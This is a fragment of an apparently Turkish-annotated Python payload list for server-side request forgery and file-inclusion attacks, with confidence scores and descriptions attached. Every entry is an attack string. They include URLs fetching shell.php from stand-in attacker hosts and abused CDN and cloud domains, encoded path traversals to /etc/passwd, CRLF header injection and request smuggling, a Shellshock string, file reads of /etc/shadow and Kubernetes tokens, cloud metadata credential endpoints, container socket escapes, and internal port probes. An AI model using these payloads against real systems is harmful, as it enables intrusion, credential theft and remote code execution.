    {"payload": "https://cloudfront.amazonaws.com/shell.php", "guven": 0.88, "aciklama": "CloudFront domain fronting"},
    {"payload": "https://d1234567890.cloudfront.net/shell.php", "guven": 0.87, "aciklama": "CloudFront subdomain"},
    {"payload": "https://cdn.jsdelivr.net/gh/attacker/repo@main/shell.txt", "guven": 0.86, "aciklama": "JSDelivr CDN abuse"},
    {"payload": "https://unpkg.com/malicious-package@1.0.0/shell.js", "guven": 0.85, "aciklama": "Unpkg CDN abuse"},
    {"payload": "https://cdnjs.cloudflare.com/ajax/libs/../../../shell.php", "guven": 0.84, "aciklama": "Cloudflare CDN path traversal"},
    {"payload": "https://maxcdn.bootstrapcdn.com/../shell.php", "guven": 0.83, "aciklama": "Bootstrap CDN bypass"},
    {"payload": "https://ajax.googleapis.com/../shell.php", "guven": 0.82, "aciklama": "Google APIs CDN bypass"},
    {"payload": "https://fonts.googleapis.com/../shell.php", "guven": 0.81, "aciklama": "Google Fonts CDN bypass"},
    {"payload": "https://code.jquery.com/../shell.php", "guven": 0.80, "aciklama": "jQuery CDN bypass"},
    {"payload": "https://stackpath.bootstrapcdn.com/../shell.php", "guven": 0.79, "aciklama": "StackPath CDN bypass"},
    {"payload": "https://cdn.staticfile.org/../shell.php", "guven": 0.78, "aciklama": "StaticFile CDN bypass"},
    {"payload": "https://lib.baomitu.com/../shell.php", "guven": 0.77, "aciklama": "Baomitu CDN bypass"},
    {"payload": "https://fastly.com/shell.php", "guven": 0.88, "aciklama": "Fastly CDN fronting"},
    {"payload": "https://keycdn.com/shell.php", "guven": 0.87, "aciklama": "KeyCDN fronting"},
    {"payload": "https://maxcdn.com/shell.php", "guven": 0.86, "aciklama": "MaxCDN fronting"},
    {"payload": "https://azure.microsoft.com/shell.php", "guven": 0.85, "aciklama": "Azure fronting"},
    {"payload": "https://s3.amazonaws.com/bucket/shell.php", "guven": 0.89, "aciklama": "S3 bucket abuse"},
    {"payload": "https://storage.googleapis.com/bucket/shell.php", "guven": 0.88, "aciklama": "Google Cloud Storage"},
    {"payload": "https://blob.core.windows.net/container/shell.php", "guven": 0.87, "aciklama": "Azure Blob Storage"},
    {"payload": "https://cos.ap-beijing.myqcloud.com/bucket/shell.php", "guven": 0.86, "aciklama": "Tencent Cloud Object Storage"},
    {"payload": "https://oss-cn-hangzhou.aliyuncs.com/bucket/shell.php", "guven": 0.85, "aciklama": "Alibaba Cloud OSS"},
    {"payload": "https://pages.github.com/user/repo/shell.php", "guven": 0.84, "aciklama": "GitHub Pages abuse"},
    {"payload": "https://netlify.app/shell.php", "guven": 0.83, "aciklama": "Netlify hosting abuse"},
    {"payload": "https://vercel.app/shell.php", "guven": 0.82, "aciklama": "Vercel hosting abuse"},
    {"payload": "https://surge.sh/shell.php", "guven": 0.81, "aciklama": "Surge hosting abuse"},
    {"payload": "https://now.sh/shell.php", "guven": 0.80, "aciklama": "Now.sh hosting abuse"},
    {"payload": "https://firebase.app/shell.php", "guven": 0.84, "aciklama": "Firebase hosting abuse"},
    {"payload": "https://appspot.com/shell.php", "guven": 0.83, "aciklama": "App Engine abuse"},
    {"payload": "https://herokuapp.com/shell.php", "guven": 0.82, "aciklama": "Heroku abuse"},
    {"payload": "https://repl.it/@user/project/shell.php", "guven": 0.81, "aciklama": "Repl.it abuse"},

    # Encoding Kombinasyonları (201-230)
    {"payload": "http://attacker.com/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "guven": 0.90, "aciklama": "URL encoded path traversal"},
    {"payload": "http://attacker.com/%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd", "guven": 0.89, "aciklama": "URL encoded Windows traversal"},
    {"payload": "http://attacker.com/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "guven": 0.88, "aciklama": "Double URL encoded traversal"},
    {"payload": "http://attacker.com/....//....//....//etc//passwd", "guven": 0.87, "aciklama": "Unicode traversal"},
    {"payload": "http://attacker.com/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd", "guven": 0.86, "aciklama": "UTF-8 overlong encoding"},
    {"payload": "http://attacker.com/%e0%80%ae%e0%80%ae%e0%80%af%e0%80%ae%e0%80%ae%e0%80%af%e0%80%ae%e0%80%ae%e0%80%afetc%e0%80%afpasswd", "guven": 0.85, "aciklama": "UTF-8 3-byte overlong"},
    {"payload": "http://attacker.com/%f0%80%80%ae%f0%80%80%ae%f0%80%80%af%f0%80%80%ae%f0%80%80%ae%f0%80%80%af%f0%80%80%ae%f0%80%80%ae%f0%80%80%afetc%f0%80%80%afpasswd", "guven": 0.84, "aciklama": "UTF-8 4-byte overlong"},
    {"payload": "http://attacker.com/..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd", "guven": 0.83, "aciklama": "UTF-8 alternate encoding"},
    {"payload": "http://attacker.com/..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd", "guven": 0.82, "aciklama": "UTF-8 slash encoding"},
    {"payload": "http://attacker.com/%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215etc%u2215passwd", "guven": 0.81, "aciklama": "Unicode slash"},
    {"payload": "http://attacker.com/%uff0e%uff0e%uff0f%uff0e%uff0e%uff0f%uff0e%uff0e%uff0fetc%uff0fpasswd", "guven": 0.80, "aciklama": "Fullwidth Unicode"},
    {"payload": "http://attacker.com/..%5c..%5c..%5cetc%5cpasswd", "guven": 0.87, "aciklama": "Backslash traversal"},
    {"payload": "http://attacker.com/..\\..\\..\\etc\\passwd", "guven": 0.86, "aciklama": "Raw backslash traversal"},
    {"payload": "http://attacker.com/....\\\\....\\\\....\\\\etc\\\\passwd", "guven": 0.85, "aciklama": "Double backslash traversal"},
    {"payload": "http://attacker.com/%2e%2e%2f%2e%2e%5c%2e%2e%2fetc%2fpasswd", "guven": 0.84, "aciklama": "Mixed slash encoding"},
    {"payload": "http://attacker.com/..%2f..%5c..%2fetc%2fpasswd", "guven": 0.83, "aciklama": "Mixed raw and encoded"},
    {"payload": "http://attacker.com/%2e%2e/%2e%2e\\%2e%2e/etc/passwd", "guven": 0.82, "aciklama": "Mixed encoding levels"},
    {"payload": "http://attacker.com/....%2f....%2f....%2fetc%2fpasswd", "guven": 0.81, "aciklama": "Quad dot traversal"},
    {"payload": "http://attacker.com/...%2f...%2f...%2fetc%2fpasswd", "guven": 0.80, "aciklama": "Triple dot traversal"},
    {"payload": "http://attacker.com/.%2e/.%2e/.%2e/etc/passwd", "guven": 0.85, "aciklama": "Mixed dot encoding"},
    {"payload": "http://attacker.com/%2e./%2e./%2e./etc/passwd", "guven": 0.84, "aciklama": "Reverse mixed dot"},
    {"payload": "http://attacker.com/..%09..%09..%09etc%09passwd", "guven": 0.83, "aciklama": "Tab separator"},
    {"payload": "http://attacker.com/..%0a..%0a..%0aetc%0apasswd", "guven": 0.82, "aciklama": "Newline separator"},
    {"payload": "http://attacker.com/..%0d..%0d..%0detc%0dpasswd", "guven": 0.81, "aciklama": "Carriage return separator"},
    {"payload": "http://attacker.com/..%20..%20..%20etc%20passwd", "guven": 0.80, "aciklama": "Space separator"},
    {"payload": "http://attacker.com/..%00..%00..%00etc%00passwd", "guven": 0.88, "aciklama": "Null byte separator"},
    {"payload": "http://attacker.com/..%ff..%ff..%ffetc%ffpasswd", "guven": 0.87, "aciklama": "High byte separator"},
    {"payload": "http://attacker.com/..%01..%01..%01etc%01passwd", "guven": 0.86, "aciklama": "Low control char"},
    {"payload": "http://attacker.com/..%7f..%7f..%7fetc%7fpasswd", "guven": 0.85, "aciklama": "DEL character separator"},
    {"payload": "http://attacker.com/..%1f..%1f..%1fetc%1fpasswd", "guven": 0.84, "aciklama": "Unit separator"},

    # DNS ve Subdomain Bypass (231-260)
    {"payload": "http://attacker.com.evil.com/shell.php", "guven": 0.86, "aciklama": "Subdomain confusion"},
    {"payload": "http://evil.com.attacker.com/shell.php", "guven": 0.85, "aciklama": "Reverse subdomain"},
    {"payload": "http://attacker-com.evil.com/shell.php", "guven": 0.84, "aciklama": "Hyphen subdomain"},
    {"payload": "http://attackercom.evil.com/shell.php", "guven": 0.83, "aciklama": "Concat subdomain"},
    {"payload": "http://www.attacker.com.evil.com/shell.php", "guven": 0.82, "aciklama": "WWW subdomain confusion"},
    {"payload": "http://attacker.com..evil.com/shell.php", "guven": 0.81, "aciklama": "Double dot subdomain"},
    {"payload": "http://attacker.com.-evil.com/shell.php", "guven": 0.80, "aciklama": "Dash prefix subdomain"},
    {"payload": "http://attacker.com_.evil.com/shell.php", "guven": 0.79, "aciklama": "Underscore subdomain"},
    {"payload": "http://attacker.com0.evil.com/shell.php", "guven": 0.78, "aciklama": "Numeric suffix subdomain"},
    {"payload": "http://0attacker.com.evil.com/shell.php", "guven": 0.77, "aciklama": "Numeric prefix subdomain"},
    {"payload": "http://xn--ttacker-2ra.com/shell.php", "guven": 0.85, "aciklama": "Punycode domain"},
    {"payload": "http://аttacker.com/shell.php", "guven": 0.84, "aciklama": "Cyrillic homograph"},
    {"payload": "http://αttacker.com/shell.php", "guven": 0.83, "aciklama": "Greek homograph"},
    {"payload": "http://ａttacker.com/shell.php", "guven": 0.82, "aciklama": "Fullwidth homograph"},
    {"payload": "http://attacker.co‍m/shell.php", "guven": 0.81, "aciklama": "Zero-width joiner"},
    {"payload": "http://attacker.c‌om/shell.php", "guven": 0.80, "aciklama": "Zero-width non-joiner"},
    {"payload": "http://attacker.c​om/shell.php", "guven": 0.79, "aciklama": "Zero-width space"},
    {"payload": "http://attacker.com‬/shell.php", "guven": 0.78, "aciklama": "Right-to-left override"},
    {"payload": "http://attacker.com‫/shell.php", "guven": 0.77, "aciklama": "Right-to-left embedding"},
    {"payload": "http://attacker.com‪/shell.php", "guven": 0.76, "aciklama": "Left-to-right embedding"},
    {"payload": "http://attacker.ᴄom/shell.php", "guven": 0.83, "aciklama": "Small caps homograph"},
    {"payload": "http://attacker.ⅽom/shell.php", "guven": 0.82, "aciklama": "Roman numeral homograph"},
    {"payload": "http://attacker.ｃom/shell.php", "guven": 0.81, "aciklama": "Fullwidth c homograph"},
    {"payload": "http://attacker.ϲom/shell.php", "guven": 0.80, "aciklama": "Greek small letter c"},
    {"payload": "http://attacker.сom/shell.php", "guven": 0.79, "aciklama": "Cyrillic c homograph"},
    {"payload": "http://attacker.com.attacker.com/shell.php", "guven": 0.85, "aciklama": "Self-referencing subdomain"},
    {"payload": "http://*.attacker.com/shell.php", "guven": 0.84, "aciklama": "Wildcard subdomain"},
    {"payload": "http://[].attacker.com/shell.php", "guven": 0.83, "aciklama": "Bracket subdomain"},
    {"payload": "http://*.*.attacker.com/shell.php", "guven": 0.82, "aciklama": "Double wildcard"},
    {"payload": "http://192.168.1.1.attacker.com/shell.php", "guven": 0.86, "aciklama": "IP subdomain spoofing"},

    # Header ve Request Manipulation (261-290)
    {"payload": "http://attacker.com/shell.php\r\nX-Forwarded-For: 127.0.0.1", "guven": 0.88, "aciklama": "CRLF injection"},
    {"payload": "http://attacker.com/shell.php\r\nHost: localhost", "guven": 0.87, "aciklama": "Host header injection"},
    {"payload": "http://attacker.com/shell.php\n\nGET /admin HTTP/1.1", "guven": 0.86, "aciklama": "HTTP request smuggling"},
    {"payload": "http://attacker.com/shell.php\r\n\r\nGET /shell.php HTTP/1.1\r\nHost: evil.com", "guven": 0.85, "aciklama": "HTTP desync attack"},
    {"payload": "http://attacker.com/shell.php?a=b\r\nReferer: http://localhost/admin", "guven": 0.84, "aciklama": "Referer injection"},
    {"payload": "http://attacker.com/shell.php\r\nUser-Agent: () { :; }; echo vulnerable", "guven": 0.83, "aciklama": "Shellshock attempt"},
    {"payload": "http://attacker.com/shell.php\r\nX-Real-IP: 127.0.0.1", "guven": 0.82, "aciklama": "Real IP spoofing"},
    {"payload": "http://attacker.com/shell.php\r\nX-Originating-IP: 127.0.0.1", "guven": 0.81, "aciklama": "Originating IP spoofing"},
    {"payload": "http://attacker.com/shell.php\r\nClient-IP: 127.0.0.1", "guven": 0.80, "aciklama": "Client IP spoofing"},
    {"payload": "http://attacker.com/shell.php\r\nX-Remote-IP: 127.0.0.1", "guven": 0.79, "aciklama": "Remote IP spoofing"},
    {"payload": "http://attacker.com/shell.php\r\nX-Remote-Addr: 127.0.0.1", "guven": 0.78, "aciklama": "Remote addr spoofing"},
    {"payload": "http://attacker.com/shell.php\r\nX-ProxyUser-Ip: 127.0.0.1", "guven": 0.77, "aciklama": "Proxy user IP spoofing"},
    {"payload": "http://attacker.com/shell.php\r\nX-Original-URL: /admin", "guven": 0.85, "aciklama": "Original URL override"},
    {"payload": "http://attacker.com/shell.php\r\nX-Rewrite-URL: /admin", "guven": 0.84, "aciklama": "Rewrite URL override"},
    {"payload": "http://attacker.com/shell.php\r\nContent-Length: 0\r\n\r\nPOST /admin", "guven": 0.83, "aciklama": "Content length smuggling"},
    {"payload": "http://attacker.com/shell.php\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /admin", "guven": 0.86, "aciklama": "Chunked encoding smuggling"},
    {"payload": "http://attacker.com/shell.php\r\nConnection: keep-alive\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX", "guven": 0.85, "aciklama": "Keep-alive smuggling"},
    {"payload": "http://attacker.com/shell.php\r\nExpect: 100-continue\r\n\r\n", "guven": 0.82, "aciklama": "Expect header bypass"},
    {"payload": "http://attacker.com/shell.php\r\nUpgrade: h2c\r\nConnection: Upgrade", "guven": 0.81, "aciklama": "HTTP/2 upgrade smuggling"},
    {"payload": "http://attacker.com/shell.php\r\nHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA", "guven": 0.80, "aciklama": "HTTP/2 settings injection"},
    {"payload": "http://attacker.com/shell.php\x00\r\nHost: evil.com", "guven": 0.87, "aciklama": "Null byte header injection"},
    {"payload": "http://attacker.com/shell.php\x0a\x0dHost: evil.com", "guven": 0.86, "aciklama": "Mixed line ending injection"},
    {"payload": "http://attacker.com/shell.php\x0dHost: evil.com", "guven": 0.85, "aciklama": "CR only injection"},
    {"payload": "http://attacker.com/shell.php\x0aHost: evil.com", "guven": 0.84, "aciklama": "LF only injection"},
    {"payload": "http://attacker.com/shell.php\x85Host: evil.com", "guven": 0.83, "aciklama": "NEL injection"},
    {"payload": "http://attacker.com/shell.php\x0bHost: evil.com", "guven": 0.82, "aciklama": "VT injection"},
    {"payload": "http://attacker.com/shell.php\x0cHost: evil.com", "guven": 0.81, "aciklama": "FF injection"},
    {"payload": "http://attacker.com/shell.php\x1cHost: evil.com", "guven": 0.80, "aciklama": "FS injection"},
    {"payload": "http://attacker.com/shell.php\x1dHost: evil.com", "guven": 0.79, "aciklama": "GS injection"},
    {"payload": "http://attacker.com/shell.php\x1eHost: evil.com", "guven": 0.78, "aciklama": "RS injection"},

    # Advanced File System Bypass (291-320)
    {"payload": "file:///proc/self/environ", "guven": 0.90, "aciklama": "Process environment"},
    {"payload": "file:///proc/self/cmdline", "guven": 0.89, "aciklama": "Process command line"},
    {"payload": "file:///proc/self/maps", "guven": 0.88, "aciklama": "Process memory maps"},
    {"payload": "file:///proc/self/status", "guven": 0.87, "aciklama": "Process status"},
    {"payload": "file:///proc/self/fd/0", "guven": 0.86, "aciklama": "Process stdin"},
    {"payload": "file:///proc/self/fd/1", "guven": 0.85, "aciklama": "Process stdout"},
    {"payload": "file:///proc/self/fd/2", "guven": 0.84, "aciklama": "Process stderr"},
    {"payload": "file:///proc/version", "guven": 0.88, "aciklama": "Kernel version"},
    {"payload": "file:///proc/cpuinfo", "guven": 0.87, "aciklama": "CPU information"},
    {"payload": "file:///proc/meminfo", "guven": 0.86, "aciklama": "Memory information"},
    {"payload": "file:///proc/mounts", "guven": 0.85, "aciklama": "Mounted filesystems"},
    {"payload": "file:///proc/net/arp", "guven": 0.84, "aciklama": "ARP table"},
    {"payload": "file:///proc/net/route", "guven": 0.83, "aciklama": "Routing table"},
    {"payload": "file:///proc/net/tcp", "guven": 0.82, "aciklama": "TCP connections"},
    {"payload": "file:///proc/net/udp", "guven": 0.81, "aciklama": "UDP connections"},
    {"payload": "file:///sys/class/net/eth0/address", "guven": 0.85, "aciklama": "MAC address"},
    {"payload": "file:///sys/class/dmi/id/product_uuid", "guven": 0.84, "aciklama": "System UUID"},
    {"payload": "file:///sys/class/dmi/id/board_serial", "guven": 0.83, "aciklama": "Board serial"},
    {"payload": "file:///var/log/auth.log", "guven": 0.89, "aciklama": "Authentication log"},
    {"payload": "file:///var/log/apache2/access.log", "guven": 0.88, "aciklama": "Apache access log"},
    {"payload": "file:///var/log/apache2/error.log", "guven": 0.87, "aciklama": "Apache error log"},
    {"payload": "file:///var/log/nginx/access.log", "guven": 0.86, "aciklama": "Nginx access log"},
    {"payload": "file:///var/log/nginx/error.log", "guven": 0.85, "aciklama": "Nginx error log"},
    {"payload": "file:///var/log/mysql/error.log", "guven": 0.84, "aciklama": "MySQL error log"},
    {"payload": "file:///var/log/syslog", "guven": 0.88, "aciklama": "System log"},
    {"payload": "file:///var/log/messages", "guven": 0.87, "aciklama": "System messages"},
    {"payload": "file:///var/log/kern.log", "guven": 0.86, "aciklama": "Kernel log"},
    {"payload": "file:///etc/shadow", "guven": 0.92, "aciklama": "Shadow password file"},
    {"payload": "file:///etc/hosts", "guven": 0.85, "aciklama": "Hosts file"},
    {"payload": "file:///etc/resolv.conf", "guven": 0.84, "aciklama": "DNS resolver config"},

    # Cloud Metadata Endpoints (321-350)
    {"payload": "http://169.254.169.254/latest/meta-data/", "guven": 0.95, "aciklama": "AWS metadata service"},
    {"payload": "http://169.254.169.254/latest/user-data/", "guven": 0.94, "aciklama": "AWS user data"},
    {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "guven": 0.93, "aciklama": "AWS IAM credentials"},
    {"payload": "http://169.254.169.254/computeMetadata/v1/", "guven": 0.92, "aciklama": "Google Cloud metadata"},
    {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "guven": 0.91, "aciklama": "Azure metadata service"},
    {"payload": "http://169.254.169.254/openstack/latest/meta_data.json", "guven": 0.90, "aciklama": "OpenStack metadata"},
    {"payload": "http://169.254.169.254/v1.0/meta-data/", "guven": 0.89, "aciklama": "DigitalOcean metadata"},
    {"payload": "http://169.254.169.254/metadata/v1/", "guven": 0.88, "aciklama": "Packet metadata"},
    {"payload": "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key", "guven": 0.92, "aciklama": "AWS SSH keys"},
    {"payload": "http://169.254.169.254/latest/meta-data/hostname", "guven": 0.87, "aciklama": "AWS hostname"},
    {"payload": "http://169.254.169.254/latest/meta-data/local-ipv4", "guven": 0.86, "aciklama": "AWS local IP"},
    {"payload": "http://169.254.169.254/latest/meta-data/public-ipv4", "guven": 0.85, "aciklama": "AWS public IP"},
    {"payload": "http://169.254.169.254/latest/meta-data/instance-id", "guven": 0.84, "aciklama": "AWS instance ID"},
    {"payload": "http://169.254.169.254/latest/meta-data/placement/availability-zone", "guven": 0.83, "aciklama": "AWS availability zone"},
    {"payload": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", "guven": 0.94, "aciklama": "GCP service account token"},
    {"payload": "http://169.254.169.254/computeMetadata/v1/project/project-id", "guven": 0.82, "aciklama": "GCP project ID"},
    {"payload": "http://169.254.169.254/computeMetadata/v1/instance/name", "guven": 0.81, "aciklama": "GCP instance name"},
    {"payload": "http://169.254.169.254/computeMetadata/v1/instance/zone", "guven": 0.80, "aciklama": "GCP instance zone"},
    {"payload": "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01", "guven": 0.90, "aciklama": "Azure subscription ID"},
    {"payload": "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01", "guven": 0.89, "aciklama": "Azure resource group"},
    {"payload": "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/privateIpAddress?api-version=2021-02-01", "guven": 0.88, "aciklama": "Azure private IP"},
    {"payload": "http://metadata.google.internal/computeMetadata/v1/", "guven": 0.91, "aciklama": "GCP metadata internal"},
    {"payload": "http://metadata/computeMetadata/v1/", "guven": 0.90, "aciklama": "GCP metadata short"},
    {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/", "guven": 0.89, "aciklama": "GCP instance attributes"},
    {"payload": "http://169.254.169.254/latest/meta-data/security-groups", "guven": 0.86, "aciklama": "AWS security groups"},
    {"payload": "http://169.254.169.254/latest/meta-data/network/interfaces/macs/", "guven": 0.85, "aciklama": "AWS network interfaces"},
    {"payload": "http://169.254.169.254/latest/dynamic/instance-identity/document", "guven": 0.91, "aciklama": "AWS instance identity"},
    {"payload": "http://169.254.169.254/latest/dynamic/instance-identity/signature", "guven": 0.90, "aciklama": "AWS identity signature"},
    {"payload": "http://100.100.100.200/latest/meta-data/", "guven": 0.88, "aciklama": "Alibaba Cloud metadata"},
    {"payload": "http://169.254.0.23/v1/", "guven": 0.87, "aciklama": "Oracle Cloud metadata"},

    # Container Escape Patterns (351-380)
    {"payload": "file:///var/run/docker.sock", "guven": 0.95, "aciklama": "Docker socket"},
    {"payload": "file:///proc/1/cgroup", "guven": 0.94, "aciklama": "Container detection"},
    {"payload": "file:///proc/self/cgroup", "guven": 0.93, "aciklama": "Self container info"},
    {"payload": "file:///.dockerenv", "guven": 0.92, "aciklama": "Docker environment"},
    {"payload": "file:///run/secrets/kubernetes.io/serviceaccount/token", "guven": 0.91, "aciklama": "Kubernetes service token"},
    {"payload": "file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt", "guven": 0.90, "aciklama": "Kubernetes CA cert"},
    {"payload": "file:///var/run/secrets/kubernetes.io/serviceaccount/namespace", "guven": 0.89, "aciklama": "Kubernetes namespace"},
    {"payload": "file:///proc/1/mountinfo", "guven": 0.88, "aciklama": "Mount information"},
    {"payload": "file:///proc/self/mountinfo", "guven": 0.87, "aciklama": "Self mount info"},
    {"payload": "file:///proc/mounts", "guven": 0.86, "aciklama": "Mounted filesystems"},
    {"payload": "file:///sys/fs/cgroup/memory/memory.limit_in_bytes", "guven": 0.85, "aciklama": "Container memory limit"},
    {"payload": "file:///sys/fs/cgroup/cpu/cpu.cfs_quota_us", "guven": 0.84, "aciklama": "Container CPU quota"},
    {"payload": "file:///run/containerd/containerd.sock", "guven": 0.93, "aciklama": "Containerd socket"},
    {"payload": "file:///var/run/crio/crio.sock", "guven": 0.92, "aciklama": "CRI-O socket"},
    {"payload": "file:///run/podman/podman.sock", "guven": 0.91, "aciklama": "Podman socket"},
    {"payload": "file:///proc/1/root/", "guven": 0.90, "aciklama": "Host root filesystem"},
    {"payload": "file:///proc/1/root/etc/passwd", "guven": 0.89, "aciklama": "Host passwd file"},
    {"payload": "file:///proc/1/root/etc/shadow", "guven": 0.88, "aciklama": "Host shadow file"},
    {"payload": "file:///dev/kmsg", "guven": 0.87, "aciklama": "Kernel message buffer"},
    {"payload": "file:///dev/mem", "guven": 0.95, "aciklama": "Physical memory"},
    {"payload": "file:///dev/kmem", "guven": 0.94, "aciklama": "Kernel memory"},
    {"payload": "file:///dev/port", "guven": 0.93, "aciklama": "I/O port access"},
    {"payload": "file:///sys/kernel/debug/", "guven": 0.86, "aciklama": "Kernel debug info"},
    {"payload": "file:///sys/module/", "guven": 0.85, "aciklama": "Kernel modules"},
    {"payload": "file:///boot/vmlinuz", "guven": 0.84, "aciklama": "Kernel image"},
    {"payload": "file:///boot/System.map", "guven": 0.83, "aciklama": "Kernel symbol map"},
    {"payload": "file:///proc/kallsyms", "guven": 0.87, "aciklama": "Kernel symbols"},
    {"payload": "file:///proc/modules", "guven": 0.86, "aciklama": "Loaded modules"},
    {"payload": "file:///proc/config.gz", "guven": 0.85, "aciklama": "Kernel config"},
    {"payload": "file:///proc/sys/kernel/kptr_restrict", "guven": 0.84, "aciklama": "Kernel pointer restriction"},

    # Network Service Discovery (381-410)
    {"payload": "http://localhost:22/", "guven": 0.85, "aciklama": "SSH service discovery"},
    {"payload": "http://localhost:23/", "guven": 0.80, "aciklama": "Telnet service discovery"},
    {"payload": "http://localhost:25/", "guven": 0.82, "aciklama": "SMTP service discovery"},
    {"payload": "http://localhost:53/", "guven": 0.81, "aciklama": "DNS service discovery"},
    {"payload": "http://localhost:110/", "guven": 0.80, "aciklama": "POP3 service discovery"},
    {"payload": "http://localhost:143/", "guven": 0.79, "aciklama": "IMAP service discovery"},
    {"payload": "http://localhost:443/", "guven": 0.88, "aciklama": "HTTPS service discovery"},
    {"payload": "http://localhost:993/", "guven": 0.78, "aciklama": "IMAPS service discovery"},
    {"payload": "http://localhost:995/", "guven": 0.77, "aciklama": "POP3S service discovery"},
    {"payload": "http://localhost:3306/", "guven": 0.86, "aciklama": "MySQL service discovery"},
    {"payload": "http://localhost:5432/", "guven": 0.85, "aciklama": "PostgreSQL service discovery"},
    {"payload": "http://localhost:6379/", "guven": 0.84, "aciklama": "Redis service discovery"},
    {"payload": "http://localhost:27017/", "guven": 0.83, "aciklama": "MongoDB service discovery"},
    {"payload": "http://localhost:9200/", "guven": 0.82, "aciklama": "Elasticsearch discovery"},
    {"payload": "http://localhost:5601/", "guven": 0.81, "aciklama": "Kibana discovery"},
    {"payload": "http://localhost:8080/", "guven": 0.87, "aciklama": "Alt HTTP port discovery"},
    {"payload": "http://localhost:8443/", "guven": 0.86, "aciklama": "Alt HTTPS port discovery"},
    {"payload": "http://localhost:9090/", "guven": 0.85, "aciklama": "Prometheus discovery"},
    {"payload": "http://localhost:3000/", "guven": 0.84, "aciklama": "Grafana discovery"},
    {"payload": "http://localhost:8888/", "guven": 0.83, "aciklama": "Jupyter discovery"},
    {"payload": "http://localhost:4444/", "guven": 0.82, "aciklama": "Selenium discovery"},
    {"payload": "http://localhost:8086/", "guven": 0.81, "aciklama": "InfluxDB discovery"},
    {"payload": "http://localhost:9000/", "guven": 0.85, "aciklama": "SonarQube discovery"},
    {"payload": "http://localhost:8081/", "guven": 0.84, "aciklama": "Nexus discovery"},
    {"payload": "http://localhost:8082/", "guven": 0.83, "aciklama": "Jenkins discovery"},
    {"payload": "http://localhost:9999/", "guven": 0.82, "aciklama": "Generic high port"},
    {"payload": "http://localhost:10000/", "guven": 0.81, "aciklama": "Webmin discovery"},
    {"payload": "http://localhost:11211/", "guven": 0.80, "aciklama": "Memcached discovery"},
    {"payload": "http://localhost:50070/", "guven": 0.79, "aciklama": "Hadoop NameNode"},
    {"payload": "http://localhost:8888/tree", "guven": 0.84, "aciklama": "Jupyter tree endpoint"},

    # Database Connection Strings (411-440)
    {"payload": "mysql://user:pass@localhost/database", "guven": 0.88, "aciklama": "MySQL connection string"},
    {"payload": "postgresql://user:pass@localhost/database", "guven": 0.87, "aciklama": "PostgreSQL connection"},
    {"payload": "mongodb://user:pass@localhost/database", "guven": 0.86, "aciklama": "MongoDB connection"},
    {"payload": "redis://user:pass@localhost:6379/0", "guven": 0.85, "aciklama": "Redis connection"},
    {"payload": "sqlite:///var/www/database.db", "guven": 0.84, "aciklama": "SQLite database"},
    {"payload": "oracle://user:pass@localhost:1521/xe", "guven": 0.83, "aciklama": "Oracle connection"},
    {"payload": "mssql://user:pass@localhost/database", "guven": 0.82, "aciklama": "MSSQL connection"},
    {"payload": "elasticsearch://localhost:9200", "guven": 0.81, "aciklama": "Elasticsearch connection"},
    {"payload": "cassandra://localhost:9042", "guven": 0.80, "aciklama": "Cassandra connection"},
    {"payload": "couchdb://user:pass@localhost:5984", "guven": 0.79, "aciklama": "CouchDB connection"},
    {"payload": "influxdb://user:pass@localhost:8086/database", "guven": 0.85, "aciklama": "InfluxDB connection"},
    {"payload": "neo4j://user:pass@localhost:7687", "guven": 0.84, "aciklama": "Neo4j connection"},
    {"payload": "memcached://localhost:11211", "guven": 0.78, "aciklama": "Memcached connection"},
    {"payload": "rabbitmq://user:pass@localhost:5672", "guven": 0.83, "aciklama": "RabbitMQ connection"},
    {"payload": "kafka://localhost:9092", "guven": 0.82, "aciklama": "Kafka connection"},
    {"payload": "zookeeper://localhost:2181", "guven": 0.81, "aciklama": "Zookeeper connection"},
    {"payload": "etcd://localhost:2379", "guven": 0.80, "aciklama": "Etcd connection"},
    {"payload": "consul://localhost:8500", "guven": 0.79, "aciklama": "Consul connection"},
    {"payload": "vault://localhost:8200", "guven": 0.86, "aciklama": "Vault connection"},
    {"payload": "ldap://localhost:389", "guven": 0.85, "aciklama": "LDAP connection"},
    {"payload": "ldaps://localhost:636", "guven": 0.84, "aciklama": "LDAPS connection"},
    {"payload": "ftp://user:pass@localhost:21", "guven": 0.83, "aciklama": "FTP connection"},
    {"payload": "sftp://user:pass@localhost:22", "guven": 0.87, "aciklama": "SFTP connection"},
    {"payload": "smb://user:pass@localhost/share", "guven": 0.86, "aciklama": "SMB connection"},
    {"payload": "nfs://localhost/export", "guven": 0.82, "aciklama": "NFS connection"},
    {"payload": "git://localhost/repo.git", "guven": 0.81, "aciklama": "Git connection"},
    {"payload": "svn://localhost/repo", "guven": 0.80, "aciklama": "SVN connection"},
    {"payload": "docker://localhost:2376", "guven": 0.88, "aciklama": "Docker API connection"},
    {"payload": "kubernetes://localhost:6443", "guven": 0.87, "aciklama": "Kubernetes API"},
    {"payload": "prometheus://localhost:9090", "guven": 0.85, "aciklama": "Prometheus connection"},

    # WebDAV ve File System Access (441-470)
    {"payload": "http://localhost/webdav/shell.php", "guven": 0.86, "aciklama": "WebDAV file access"},
    {"payload": "http://localhost/_vti_bin/shell.php", "guven": 0.85, "aciklama": "SharePoint WebDAV"},
    {"payload": "http://localhost/sites/default/files/shell.php", "guven": 0.84, "aciklama": "Drupal file access"},
    {"payload": "http://localhost/wp-content/uploads/shell.php", "guven": 0.88, "aciklama": "WordPress upload dir"},
